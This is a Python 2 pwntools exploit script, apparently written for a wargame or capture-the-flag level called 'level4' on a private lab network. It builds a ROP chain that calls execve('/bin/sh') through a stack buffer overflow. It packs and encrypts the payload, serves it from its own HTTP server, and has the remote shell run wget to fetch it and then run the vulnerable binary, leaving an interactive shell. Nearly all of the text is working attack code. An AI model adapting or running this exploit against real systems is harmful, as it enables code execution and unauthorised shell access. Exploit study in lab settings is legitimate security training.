#!/usr/bin/env python2
# encoding: utf-8

from pwn import *
from decrypt import crypt, get_checksum
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from threading import Thread
import re


def pack_file(payload):
    payload = p16(len(payload)) + payload
    chk = get_checksum(payload)
    payload = p32(chk) + payload
    payload = crypt(payload, 'p4ssw0rd')
    chk = get_checksum(payload)
    payload = p32(chk) + payload

    with open('exploit.bin', 'wb') as fp:
        fp.write(payload)


class ExploitServer(BaseHTTPRequestHandler):
    def do_GET(self):
        with open('exploit.bin', 'rb') as fp:
            self.send_response(200)
            data = fp.read()
            self.send_header('Content-Length', len(data))
            self.send_header('Content-disposition', 'attachement,filename="exploit.bin"')
            self.end_headers()
            self.wfile.write(data)


class ThreadServer(Thread, HTTPServer):
    def __init__(self):
        Thread.__init__(self)
        HTTPServer.__init__(self, ('', 8000), ExploitServer)
        self.daemon = True

    def run(self):
        self.serve_forever()


def trigger():
    r.sendline('wget http://192.168.56.1:8000/exploit.bin -O exploit.bin')
    r.sendline('./level4 exploit.bin p4ssw0rd')


def attack_payload():
    #ebp = 0xFFFFCAA8
    #ebp = 0xbfb8f458
    #payload_start = ebp - 0x1018
    payload_start = 0x42424242
    offset = 0x1018 + 4
    print(hex(payload_start))

    elf = ELF('level4')
    rop = ROP([elf])

    def add_gadget(addr, *names):
        rop.gadgets[addr] = {
                'insns': names,
                'regs': [],
                'move': 0
                }

    int_80 = 0x08048b2d
    add_gadget(int_80, 'int 80')
    push_esp = 0x080644c1
    add_gadget(push_esp, 'push esp', 'ret')
    push_ebp = 0x080c8a1f
    add_gadget(push_ebp, 'push ebp', 'ret')
    mov_esp_ecx = 0x080a858e
    add_gadget(mov_esp_ecx, 'mov esp, ecx', 'ret')
    pop_ecx_ebx = 0x080583ad
    add_gadget(pop_ecx_ebx, 'pop ecx', 'pop ebx', 'ret')
    push_esp_pop = 0x0809c45a
    add_gadget(push_esp_pop, 'push esp', 'pop ebx', 'pop esi', 'pop edi', 'pop ebp', 'ret')
    push_eax = 0x080a82c6
    add_gadget(push_eax, 'push eax', 'ret')
    push_eax_dec_esp = 0x080a82b9
    add_gadget(push_eax_dec_esp, 'push eax', 'dec esp', 'ret')

    rop.raw(pop_ecx_ebx)
    rop.raw(0)
    rop.raw(0)
    rop.raw(push_esp_pop) # ebx == esp
    rop.raw('/bin') # esi
    rop.raw('/sh\x00') # edi
    rop.raw(0) # ebp
    rop.raw(rop.eax[0])
    rop.raw(0xb)
    rop.raw(rop.edx[0])
    rop.raw(0)
    rop.raw(int_80)
    print(rop.dump())

    payload = 'A' * offset + str(rop)

    pack_file(payload)


def get_offset():
    payload = cyclic(0x2000)
    pack_file(payload)
    trigger()
    r.sendline('dmesg | tail -1')
    result = r.recvline()
    m = re.search('segfault at .* ip (.*) sp (.*) error ', result)
    eip, esp = m.group(1).decode('hex'), int(m.group(2), 16)
    print(eip)
    offset = cyclic_find(eip)

    return offset, esp

httpd = ThreadServer()
httpd.start()

#context.log_level = 'debug'

r = remote('192.168.56.101', 44443)
r.sendline('cd ~level3')
#
#offset, esp = get_offset()
#print(hex(offset))
#print(hex(esp))

attack_payload()
trigger()
r.sendline('dmesg | tail -1')
r.interactive()
print(r.recvline())
